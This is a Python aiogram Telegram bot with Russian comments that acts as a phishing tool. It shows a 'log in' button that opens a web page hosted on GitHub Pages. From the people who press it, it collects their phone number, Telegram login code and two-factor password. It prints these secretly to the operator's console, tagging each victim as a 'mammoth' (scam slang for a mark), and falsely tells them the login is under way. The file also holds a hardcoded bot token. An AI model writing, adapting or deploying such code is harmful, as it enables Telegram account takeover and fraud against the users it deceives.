import asyncio
import logging
import json
import sys
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, ReplyKeyboardMarkup, KeyboardButton

# ==========================================
# 👇 НАСТРОЙКИ 👇
# ==========================================
BOT_TOKEN = "8563110236:AAEO8GlnHVxtsMjbaiQ-EuHq7hphAaMzXL0"
# Ссылка на сайт (меняй цифры в конце, если обновишь HTML)
WEB_APP_URL = "https://vanchopiki.github.io/test/index.html?v=1000"
# ==========================================

# Логирование (только основное)
logging.basicConfig(level=logging.INFO, stream=sys.stdout)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# --- ФУНКЦИЯ КНОПОК ---
async def send_ui(message: types.Message, need_pass: bool):
    if need_pass:
        separator = "&" if "?" in WEB_APP_URL else "?"
        url = f"{WEB_APP_URL}{separator}p=1"
        txt = "🔐 <b>Вход с ПАРОЛЕМ</b>\nНажми кнопку внизу 👇"
    else:
        url = WEB_APP_URL
        txt = "📱 <b>Вход в Telegram</b>\nНажми кнопку внизу 👇"

    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="⚡ Войти", web_app=WebAppInfo(url=url))]],
        resize_keyboard=True,
        input_field_placeholder="Нажми кнопку..."
    )
    await message.answer(txt, reply_markup=kb, parse_mode="HTML")


# 1. Режим с паролем
@dp.message(F.text.lower() == "пароль")
async def mode_pass(msg: types.Message):
    await send_ui(msg, True)


# 2. Обычный режим
@dp.message(Command("start"))
@dp.message()
async def mode_default(msg: types.Message):
    await send_ui(msg, False)


# 3. ПОЛУЧЕНИЕ ДАННЫХ
@dp.message(F.web_app_data)
async def data_handler(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)

        phone = data.get('phone', '-')
        code = data.get('code', '-')
        password = data.get('password', '')

        # === ВЫВОД В КОНСОЛЬ (СЕКРЕТНО) ===
        print("\n" + "=" * 40)
        print(f"🦈 МАМОНТ: {message.from_user.full_name} (@{message.from_user.username})")
        print(f"📞 PHONE: {phone}")
        print(f"🔢 CODE:  {code}")
        print(f"🔑 PASS:  {password if password else '[НЕТ]'}")
        print("=" * 40 + "\n")

        # === ОТВЕТ ПОЛЬЗОВАТЕЛЮ ===
        await message.answer("✅ <b>Данные приняты.</b>\nВыполняется вход...", parse_mode="HTML")

    except Exception as e:
        print(f"Ошибка: {e}")


if __name__ == "__main__":
    try:
        print("✅ Бот работает...")
        asyncio.run(dp.start_polling(bot))
    except KeyboardInterrupt:
        print("Бот выключен.")